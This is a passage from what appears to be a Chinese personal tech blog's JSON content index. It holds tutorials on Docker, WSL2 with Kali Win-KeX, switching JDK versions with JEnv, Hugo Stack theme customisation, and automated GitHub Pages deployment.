docker cp 本地文件路径 \u0026lt;容器ID\u0026gt;/\u0026lt;容器名\u0026gt;:容器内部存放文件位置 打包容器为镜像 1 docker commit \u0026lt;容器ID\u0026gt; \u0026lt;打包后的镜像名\u0026gt;:\u0026lt;版本号\u0026gt; 附录 参考文献 《【Docker】掌握 Docker魔法：Windows 11 平台上的完美容器部署终极指南》\n版权信息 本文原载于 Ranch\u0026rsquo;s Blog，遵循 CC BY-NC-SA 4.0 协议，复制请保留原文出处。\n","date":"2024-11-08T21:43:41+08:00","image":"http://ranch007.github.io/p/%E6%8E%8C%E6%8F%A1-docker%E9%AD%94%E6%B3%95windows-11-%E5%B9%B3%E5%8F%B0%E4%B8%8A%E7%9A%84%E5%AE%8C%E7%BE%8E%E5%AE%B9%E5%99%A8%E9%83%A8%E7%BD%B2%E7%BB%88%E6%9E%81%E6%8C%87%E5%8D%97/docker_hu12023594874665799484.png","permalink":"http://ranch007.github.io/p/%E6%8E%8C%E6%8F%A1-docker%E9%AD%94%E6%B3%95windows-11-%E5%B9%B3%E5%8F%B0%E4%B8%8A%E7%9A%84%E5%AE%8C%E7%BE%8E%E5%AE%B9%E5%99%A8%E9%83%A8%E7%BD%B2%E7%BB%88%E6%9E%81%E6%8C%87%E5%8D%97/","title":"掌握 Docker魔法：Windows 11 平台上的完美容器部署终极指南"},{"content":" 前置条件 CPU 虚拟化 修改BIOS设置（VMX/AMD-v） windows 功能 适用于Linux的windows子系统 虚拟机平台 安装 默认 ubuntu 发行版 管理员权限打开 cmd\n1 wsl --install kali-linux --web-download 查看在线发行版 1 wsl --list --online 查看安装的子系统 1 wsl --list -v 如果 windows下 sublinux 安装出现“不能访问网络位置+有关网络排除故障的信息”\n1 2 3 4 netsh winsock reset netsh int ip reset all netsh winhttp reset proxy ipconfig /flushdns 使用 切换默认子系统 1 wsl --set-default xxx 启动指定的子系统 1 wsl -d kali-linux 卸载 1 wsl --unregister kali-linux 备份 1 2 3 4 5 # 导出 wsl --export kali-linux kali.tar # 导入 wsl --import kali2 D:/wsl C:\\Users\\admin\\Desktop kali 打开桌面窗口 wsl2 黑科技 WSLg 允许 Linux 里面带有UI的应用程序，直接以 Windows 窗口的形式打开\n显卡直通 1 2 # 查看显卡 nvidia-smi 镜像网络模式 在 C:\\Users\\xxx 下面创建 .wslconfig 文件\n1 2 [wsl2] networkingMode = mirrored 然后保存，使用 wsl --shutdown 关闭虚拟机，等 8 秒。\nkali 安装 Win-Kex 参考官方文档：【Win-Kex为Kali Linux提供GUI桌面体验】\nwin-kex支持以下三种模式\n窗口模式 要在支持声音的 Window 模式下启动 Win-KeX，请运行以下任一命令：\nKali WSL 内部：kex --win -s 在 Windows 的命令提示符上：wsl -d kali-linux kex --win -s 有关更多信息，请参阅【 Win-KeX 窗口模式使用文档】。\n增强的会话模式 要在具有声音支持和 ARM 解决方法的增强会话模式下启动 Win-KeX\n请运行以下任一命令：\nKali WSL 内部：kex --esm --ip -s 在 Windows 的命令提示符上：wsl -d kali-linux kex --esm --ip -s 有关更多信息，请参阅【 Win-KeX 增强型会话模式使用文档】。\n无缝模式 使用无缝模式（win-kex SL），请在WSL设置里，将网络模式更改为NAT\n进入kali系统，修改/etc/resolv.conf文件里的nameserver，其IP地址与windows中vEthernet (WSL (Hyper-V firewall))IP地址一致。\n要在具有声音支持的无缝模式下启动 Win-KeX，请运行，运行以下任一：\nKali WSL 内部：kex --sl -s 在 Windows 的命令提示符上：wsl -d kali-linux kex --sl -s 有关更多信息，请参阅【 Win-KeX SL 使用文档】。\n附录 参考文献 《WSL2 + linux配置流程超详细指南 | mednight4》\n版权信息 本文原载于 Ranch\u0026rsquo;s Blog，遵循 CC BY-NC-SA 4.0 协议，复制请保留原文出处。\n","date":"2024-11-02T21:54:21+08:00","image":"http://ranch007.github.io/p/%E8%B6%85%E8%AF%A6%E7%BB%86%E7%9A%84wsl2%E6%95%99%E7%A8%8Bwindows%E4%B8%8A%E7%9A%84linux%E5%AD%90%E7%B3%BB%E7%BB%9F/wsl_hu2516149183884693131.png","permalink":"http://ranch007.github.io/p/%E8%B6%85%E8%AF%A6%E7%BB%86%E7%9A%84wsl2%E6%95%99%E7%A8%8Bwindows%E4%B8%8A%E7%9A%84linux%E5%AD%90%E7%B3%BB%E7%BB%9F/","title":"超详细的wsl2教程：windows上的linux子系统"},{"content":" JEnv 介绍 【JEnv-for-Windows】是一个专为Windows系统设计的开源工具，由FelixSelter开发，其核心功能是让开发者能够轻松地在不同版本的Java开发工具包（JDK）之间进行切换。\n关键技术和框架 批处理脚本：用于创建快捷的Java版本切换逻辑； PowerShell脚本：用于环境变量的动态管理，兼容性增强，以及更高级的操作； 无需额外依赖：直接通过环境变量和脚本操作来实现JDK版本的管理。 这是如何运作的呢？ 准备工作和详细安装步骤 步骤一：下载JDK并配置 安装 JDK jdk-1.8 正常一步一步安装【jdk-8u421-windows-x64.exe】\njdk-xxx 将其他版本jdk的.zip压缩包解压到对应文件夹\n最终目录结构可参考： 配置环境变量 ①新建系统变量JAVA_HOME，路径为jdk8路径\n②新建系统变量CLASSPATH，指定类搜索路径\n③系统变量Path中添加对应路径\n步骤二：JEnv-for-Windows项目获取 从GitHub克隆该仓库到本地对应文件夹\n1 git clone https://github.com/FelixSelter/JEnv-for-Windows.git 步骤三：JEnv环境准备 删除旧的JAVA_HOME 添加JEnv到系统路径 将刚克隆的项目路径添加到系统的环境变量Path中，确保可以从任何地方调用jenv.bat脚本。\n步骤四：初始化与配置 首次运行JEnv 1 jenv -help 添加JAVA环境 接下来，将其他版本jdk添加到JEnv管理中\n1 2 jenv add jkd8 C:\\Environment\\Java\\jdk-1.8 jenv add jdk17 C:\\Environment\\Java\\jdk-17.0.12 步骤五：验证 列出jenv管理的所有jdk版本：\n1 jenv list 用命令切换jdk版本：\n1 jenv use {name} 日常操作及使用方法 添加新的Java环境（需要绝对路径）\njenv add\u0026lt;name\u0026gt; \u0026lt;path\u0026gt;\n示例：jenv add jdk15 D:\\Programme\\Java\\jdk-15.0.1\n更改当前会话的 java 版本\njenv use\u0026lt;name\u0026gt;\n示例：jenv use jdk15\n脚本编写的环境变量：\n\u0026mdash;PowerShell: $ENV:JENVUSE=\u0026quot;jdk17\u0026quot;\n\u0026mdash;CMD/BATCH:set \u0026quot;JENVUSE=jdk17\u0026quot;\n清除当前会话的 java 版本\njenv use remove\n示例：jenv use remove\n用于脚本编写的环境变量：\n\u0026mdash;PowerShell: $ENV:JENVUSE=$null\n\u0026mdash;CMD/BATCH:set \u0026quot;JENVUSE=\u0026quot;\n全局更改您的 java 版本\njenv change\u0026lt;name\u0026gt;\n示例：jenv change jdk15\n始终在此文件夹\njenv local\u0026lt;name\u0026gt;\n中使用此 java 版本 示例：jenv local jdk15\n清除此文件夹的 java 版本\njenv local remove\n示例：jenv local remove\n列出所有 Java 环境\njenv list\n示例：jenv list\n从 JEnv 列表中删除现有的 JDK\njenv remove\u0026lt;name\u0026gt;\n示例：jenv remove jdk15\n允许使用位于 java 目录\njenv link\u0026lt;Executable name\u0026gt;\n中的 javac、javaw 或其他可执行文件 示例：jenv link javac\n卸载 jenv 并自动恢复您选择的 Java 版本\njenv uninstall\u0026lt;name\u0026gt;\n示例：jenv uninstall jdk17\n自动搜索要添加的 java 版本\njenv autoscan [\u0026ndash;yes|-y]?\u0026lt;path\u0026gt;?\n示例：jenv autoscan \u0026quot;C:\\Program Files\\Java\u0026quot;\n示例：jenv autoscan// 将搜索整个系统 示例：jenv autoscan -y \u0026quot;C:\\Program Files\\Java\u0026quot;// 将接受默认值\n附录 参考文献 JEnv-for-Windows 安装与配置完全指南 版权信息 本文原载于 Ranch\u0026rsquo;s Blog，遵循 CC BY-NC-SA 4.0 协议，复制请保留原文出处。\n","date":"2024-10-22T19:37:09+08:00","image":"http://ranch007.github.io/p/jenv-for-windows-%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97/jenv-for-windows_hu11298204453850082782.png","permalink":"http://ranch007.github.io/p/jenv-for-windows-%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97/","title":"Win11使用JEnv管理多版本jdk"},{"content":" [!TIP]\n避免踩坑的建议：\n凡是需要更改的文件都从themes/主题复制到主目录（hugo new site xxx创建的那个）下\n接下来的个性化配置文件建议都在博客主目录下操作，减少更新主题时个性化配置被覆盖的麻烦\n每次服务启动，会同步更新所有位置配置文件，但主目录配置文件优先级最高\n导入主题 安装主题一般而言存在三种方式：\ngit submodule 安装 go module 安装（需要安装 Go 语言） 本地安装 ​\t我个人更推荐第一种方式，考虑到后续升级的难易，这算是最均衡的一种方式。具体的安装方法可以在各主题的说明中找到，我这里安装的是【Stack】。 在网站根目录下，输入：\n1 2 3 4 5 git submodule add https://github.com/CaiJimmy/hugo-theme-stack/ hugo-theme-stack # 更新主题 git submodule init\t//初始化子模块 git submodule update\t//更新子模块到最新版本 ​\t等待下载完成后，便可以进行【配置】了。假如你想用其他方式安装，也可以参考【这里】，而且Stack本身有全英文的【说明文档】。我建议是将./themes/hugo-theme-stack/exampleSite/文件下的content和hugo.yaml直接复制到博客主目录下（这是一个作者放的例子，这里面有许多提示），根据说明与需求修改，会剩下很多时间。\n基础配置 打开hugo.yaml ​\t本地调试的时候baseurl可以设置为http://localhost:1313。调试完推送到GitHub上，记得改为网站根目录，有疑问请参考【这里】。\n网站 icon、时间格式、博客头像 网站icon存储路径：/static/favcion.ico Go语言时间格式： 博客头像存储路径：/assets/img/avatar.png favicon、avatar的路径格式如下图所示\nLicense和留言板功能 license：做好公共版权许可协议声明 comments：进入【Giscus】官网，在线安装app，进入Giscus的配置页面，根据官方提示配置留言板功能。 这里我也给出我的配置，仅供参考。Message-Boards是我新建的一个留言板专属存放的public仓库。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 comments: enabled: true provider: giscus giscus: repo: Ranch007/Message-Boards repoID: R_kgDONBh4yw category: Announcements categoryID: DIC_kwDONBh4y84CjbwV mapping: pathname strict: 0 lightTheme: 0 darkTheme: 0 reactionsEnabled: 1 emitMetadata: 0 inputPosition: top lang: zh-CN 社交功能 加入个人社交平台的链接 icon路径：博客主目录的/assets/icons下，所有icon都在这里，都是svg文件。 主题魔改 整体布局 照抄Naive Koala老师的文章《Hugo-theme-Stack 魔改美化》，文章写的很细心也很用心，属于喂饭教程。\n[!NOTE]\n1.没有目录的自己创建一个同名目录，切记要仔细保证这些单词准确\n2.代码看不懂没事，读文章尝试理解，看一下作者改的那些代码，那就是实现变动的关键点\n这里涉及到复制的文件分别有：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 themes\\hugo-theme-stack\\assets\\scss\\custom.scss 复制到 /assets/scss/custom.scss themes\\hugo-theme-stack\\layouts\\partials\\footer\\custom.html 复制到 /layouts/partials/footer/custom.html themes\\hugo-theme-stack\\assets\\scss\\partials\\sidebar.scss 复制到 /assets/scss/partials/sidebar.scss（这里需要下载两个icon，记得更改好指定命名保存到/assets/icons；还涉及到去代码中更改，作者有提供行数，版本不一样所以不一定准确，所以得审一下代码，注意缩进） themes\\hugo-theme-stack\\layouts\\partials\\sidebar\\left.html 复制到 /layouts/partials/sidebar/left.html themes\\hugo-theme-stack\\assets\\scss\\grid.scss 复制到 /assets/scss/grid.scss themes\\hugo-theme-stack\\layouts\\index.html 复制到 /layouts/index.html 在 static 文件夹下新建 code-header.svg（macOS 风格红绿灯图标） themes\\hugo-theme-stack\\assets\\scss\\partials\\layout\\article.scss 复制到 /assets/scss/partials/layout/article.scss “显示语言和复制按钮”与代码行自带的copy重叠了，这里我没有弄 如果你想更从容一点，可以提前把上面的文件复制主目录。开始魔改前，记得整体备份一下。\n一些细节 添加文章开头更新时间和字数统计 ​\t在layouts\\partials\\article\\components\\details.html文件中，红框标记的就是增添组件的代码，黄框标记的就是两个组件的icon命名（目录在/assets/icons下）\n下图所示，就是增添后的文章标题组件\n添加文章末尾最后更新时间 ​\t在博客主文件夹下 layouts\\partials\\article\\components\\footer.html更新下面代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;footer class=\u0026#34;article-footer\u0026#34;\u0026gt; {{ partial \u0026#34;article/components/tags\u0026#34; . }} {{ if and (.Site.Params.article.license.enabled) (not (eq .Params.license false)) }} \u0026lt;section class=\u0026#34;article-copyright\u0026#34;\u0026gt; {{ partial \u0026#34;helper/icon\u0026#34; \u0026#34;copyright\u0026#34; }} \u0026lt;span\u0026gt;{{ default .Site.Params.article.license.default .Params.license | markdownify }}\u0026lt;/span\u0026gt; \u0026lt;/section\u0026gt; {{ end }} {{- if ne .Lastmod .Date -}} \u0026lt;div\u0026gt; \u0026lt;section class=\u0026#34;article-lastmod\u0026#34;\u0026gt; {{ partial \u0026#34;helper/icon\u0026#34; \u0026#34;edit\u0026#34; }} \u0026lt;time class=\u0026#34;article-lastmod\u0026#34;\u0026gt; {{ T \u0026#34;article.lastUpdatedOn\u0026#34; }}{{- .Lastmod.Format (or .Site.Params.published \u0026#34;2006-01-02T15:04\u0026#34;) -}} \u0026lt;/time\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;/div\u0026gt; {{- end -}} \u0026lt;/footer\u0026gt; 通过上面代码第16行，article.lastUpdatedOn添加“最后更新于”\n添加网站运行时间组件 ​\t打开layouts\\partials\\footer\\footer.html文件，将下面代码插入\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;span id=\u0026#34;timeDate\u0026#34;\u0026gt;载入天数...\u0026lt;/span\u0026gt;\u0026lt;span id=\u0026#34;times\u0026#34;\u0026gt;载入时分秒...\u0026lt;/span\u0026gt; \u0026lt;script language=\u0026#34;javascript\u0026#34;\u0026gt; var now = new Date(); function createtime(){ // 当前时间 now.setTime(now.getTime()+250); var grt= new Date(\u0026#34;2024/10/15 00:00:00\u0026#34;); //网站诞生时间 days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); if(String(hnum).length ==1 ){hnum = \u0026#34;0\u0026#34; + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = \u0026#34;0\u0026#34; + mnum;} seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); snum = Math.round(seconds); if(String(snum).length ==1 ){snum = \u0026#34;0\u0026#34; + snum;} document.getElementById(\u0026#34;timeDate\u0026#34;).innerHTML = \u0026#34;本站已稳定运行\u0026#34;+dnum+\u0026#34; 天 \u0026#34;; document.getElementById(\u0026#34;times\u0026#34;).innerHTML = hnum + \u0026#34; 小时 \u0026#34; + mnum + \u0026#34; 分 \u0026#34; + snum + \u0026#34; 秒\u0026#34; } setInterval(\u0026#34;createtime()\u0026#34;,250); \u0026lt;/script\u0026gt; 该组件效果展示：\n左侧栏 ID 和简介换行 ​\t找到layouts\\partials\\footer\\footer.html中下方代码，更改为\n可以按照个人需求对下面代码进行调整，我将“个人ID”直接写进代码，通过更改subtitle实现换行\n1 2 3 4 \u0026lt;div class=\u0026#34;site-meta\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;site-name\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;{{ .Site.BaseURL | relLangURL }}\u0026#34;\u0026gt;\u0026lt;span\u0026gt;Ranch\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h2 class=\u0026#34;site-description\u0026#34;\u0026gt;{{ .Site.Params.sidebar.subtitle1 }}\u0026lt;br\u0026gt;{{ .Site.Params.sidebar.subtitle2 }}\u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; 实际效果展示\n到这里使用Hugo➕Stack➕Giscus部署到GitHub的博客搭建和魔改美化就告一段落啦\n后续如果有更新也会继续记录到Blog这个标签里\n附录 参考文献 《Hugo-theme-Stack 魔改美化》 《如何使用git submodule》 《将博客评论系统由 utterance 迁移至 giscus》 《hugo stack 主题美化》 《建站技术 | 使用 Hugo + Stack 简单搭建一个博客》 《Hugo和Github Action正确修改文章的最后更新日期》 版权信息 本文原载于 Ranch\u0026rsquo;s Blog，遵循 CC BY-NC-SA 4.0 协议，复制请保留原文出处。\n","date":"2024-10-20T11:55:35Z","image":"http://ranch007.github.io/p/%E5%8D%9A%E5%AE%A2%E8%A3%85%E4%BF%AE%E6%97%A5%E8%AE%B0hugo-stack-giscus%E9%AD%94%E6%94%B9%E7%BE%8E%E5%8C%96-%E7%BB%86%E8%8A%82%E6%BB%A1%E6%BB%A1/hugo-stack_hu319509881166415343.png","permalink":"http://ranch007.github.io/p/%E5%8D%9A%E5%AE%A2%E8%A3%85%E4%BF%AE%E6%97%A5%E8%AE%B0hugo-stack-giscus%E9%AD%94%E6%94%B9%E7%BE%8E%E5%8C%96-%E7%BB%86%E8%8A%82%E6%BB%A1%E6%BB%A1/","title":"【博客装修日记】Hugo➕ Stack ➕ Giscus魔改美化 细节满满"},{"content":"环境准备 Git下载 进入【git官网】，找到对应适用于自己电脑系统的版本进行下载\n根据提示，默认安装即可\nHugo下载 在【Hugo的GitHub官网】上，根据自己系统，选择对应版本直接下载 （Tips：这里我根据【Hugo官网】的建议是安装了扩展版本） 下载后解压即可 （建议）将hugo.exe所在文件夹加入用户环境变量，方便使用hugo命令 博客搭建 创建博客 （1）在hugo.exe所在文件夹上方地址栏中，输入cmd，然后回车唤起命令行 （2）输入以下命令，创建xxx文件夹（这个文件夹就是博客的主文件夹，后面也可以改名）；并给出搭建博客的步骤 1 2 # 在当前文件夹中为创建xxx博客项目 hugo new site xxx 运行后便会输出一个网站目录，其结构为（引用自炸鸡人博客）：\ncd切换进入blog\\目录，输入下面命令，启动hugo服务 1 hugo server -D Ctrl+鼠标左键点击上方链接，进入演示站点，如需停止在命令行输入Ctrl+C停止服务（hugo默认是没有主题的，后面会进行一个主题配置） 导入主题 （1）前往【Hugo Themes】，选择一个自己中意的主题 （2）安装主题一般而言存在三种方式： git submodule 安装 本地安装 go module安装（需要安装Go语言） （3）我个人使用第一种方式，考虑到后续主题升级的难易，这算是最均衡的一种方式。具体的安装方法可以在各主题的说明中找到，我这里安装的是【Stack】。 在网站目录下，输入： 1 2 3 4 5 # 前目录中初始化一个空的 Git 存储库 git init # 将stack主题克隆到`themes`目录中，并将其作为Git子模块添加到当前项目中 git submodule add https://github.com/CaiJimmy/hugo-theme-stack/ themes/hugo-theme-stack 等待下载完成后，便可以进行后面的配置了。假如你想用其他方式安装，也可以参考这里。Stack本身有全英文的说明文档，\n（4）等待下载完成。建议将exampleSite样例数据中的`Content和hugo.yaml复制到主文件夹中 （4）进入主文件下的content\\post，并删掉rich-content文件夹（不然会报错） （5）再次启动hugo服务，查看主题。具体主题配置细节放在下一篇。 GitHub部署 常规部署 （1）前往【GitHub官网】，登录或者注册一个GitHub账号，创建新的仓库{GitHub用户名}.github.io（这里我已经注册了） （2）前往进入xxx.github.io仓库，从Setting -\u0026gt; Pages先将source的“从分支部署“切换到”GitHub操作“，初始化一下，再切回“分支部署” 然后Branch出现”main分支“，选择main保存。\n（Tips：现在需要先将内容推送到GitHub才能开启GitHub Pages网址。）\n（3）回到本地博客的主文件夹。准备发布网站，执行以下命令，Hugo 会在public在项目根目录中创建整个静态网站 1 hugo -D （4）接着在进入 public 文件夹，执行以下命令上传到github仓库上，第一次上传可能需要输入账号密码 1 2 3 4 5 6 git init git add . git commit -m \u0026#34;first commit\u0026#34; git branch -M main git remote add origin https://github.com/{你的GitHub用户名}/{用户名.github.io} git push -u origin main （5）前往https://github.com/{GitHub用户名}/{用户名}.github.io，点击Branch判断有没有上传成功 自动化部署 具体要求 如果想使用 Github Actions 自动部署 hugo 博客，则最起码需要创建两个 Github 的仓库。\n第①个，便是存储博客 .md 源文件的地方，其实就是 hugo的主文件； 第②个，则是部署 Github Pages 的仓库（存放public文件夹里的所有文件），仓库名必须是 \u0026lt;GitHub用户名\u0026gt;.github.io，这是 github 官方要求的。 原理流程 1.当我们提交博客 .md 源文件到仓库 ① 后，利用 Github Actions 自动执行 hugo 的命令 2.在 public 目录下会自动生成静态网站，然后再将 public 目录推送到仓库 ② 3.由于仓库② 是 Github Pages，它接着就会自动执行部署的命令。\n（1）我们需要从主文件的仓库①推送到外部 GitHub Pages 仓库②，需要特定权限，所以还得在 GitHub 账户 Setting - Developer settings - Personal access tokens （https://github.com/settings/tokens）下创建一个 Token： 进入设置，Developer settings就在设置左下角，如下图点进去（需要验证）\n如下图进行配置，创建一个永久性token，并复制 （Tips：切记！！Token只会出现一次，请做好留存、保密）\n最后，来到以github.io结尾的仓库①。添加一个 secret，保存并命名你复制的token值，这个Name下一步需要用到。\n（2）管理博客主文件的仓库①，点击 Actions 按钮，即可添加工作流文件，该文件一般是以 .yml 结尾，这样才能被 GitHub 识别 我创建的文件名为deploy.yml，内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 name: deploy # 代码提交到main分支时触发github action on: push: branches: - main\t# 这里的意思是当 master分支发生push的时候，运行下面的jobs jobs: deploy:\t# 任务名自取 runs-on: ubuntu-latest\t# 在什么环境运行任务 steps: - name: Checkout uses: actions/checkout@v4\t# 引用actions/checkout这个action，与所在的github仓库同名 with: submodules: true\t# Fetch Hugo themes (true OR recursive) 获取submodule主题 fetch-depth: 0\t# Fetch all history for .GitInfo and .Lastmod - name: Disable quotePath run: git config --global core.quotePath false - name: Setup Hugo\t# 步骤名自取 uses: peaceiris/actions-hugo@v3\t# hugo官方提供的action，用于在任务环境中获取hugo with: hugo-version: \u0026#34;latest\u0026#34;\t# 获取最新版本的hugo extended: true - name: Build Web run: hugo -D\t# 使用hugo构建静态网页 - name: Deploy Web uses: peaceiris/actions-gh-pages@v4\t# 一个自动发布github pages的action with: personal_token: ${{ secrets.{保存toekn的Name} }}\t# 发布到其他repo需要提供上面生成的personal access token external_repository: {GitHub用户名}/{用户名}.github.io\t# 发布到哪个repo publish_branch: main\t# 发布到哪个branch publish_dir: public\t# 注意这里指的是要发布哪个文件夹的内容，而不是指发布到目的仓库的什么位置，因为hugo默认生成静态网页到public文件夹，所以这里发布public文件夹里的内容 commit_message: auto deploy 这样，我们的博客网站就部署好了，这极大地简化了我们发布文章的流程。\n附录 参考文献 【Hugo】Hugo + Github 免费部署自己的博客 (letere-gzj.github.io) 使用 Hugo 对博客的重建与 Stack 主题优化记录 使用 Github Actions 自动部署 hugo 博客 Github Actions 自动部署 Hugo 版权信息 本文原载于 Ranch\u0026rsquo;s Blog，遵循 CC BY-NC-SA 4.0 协议，复制请保留原文出处。\n","date":"2024-10-18T22:19:18Z","image":"http://ranch007.github.io/p/free%E4%BD%BF%E7%94%A8hugo%E6%90%AD%E5%BB%BAgithub%E7%A7%81%E4%BA%BA%E5%8D%9A%E5%AE%A2/post/2024-10-18/%E3%80%90free%E3%80%91%E4%BD%BF%E7%94%A8hugo%E6%90%AD%E5%BB%BAgithub%E7%A7%81%E4%BA%BA%E5%8D%9A%E5%AE%A2/hugo-stack_hu319509881166415343.png","permalink":"http://ranch007.github.io/p/free%E4%BD%BF%E7%94%A8hugo%E6%90%AD%E5%BB%BAgithub%E7%A7%81%E4%BA%BA%E5%8D%9A%E5%AE%A2/","title":"【Free】使用Hugo搭建GitHub私人博客"}]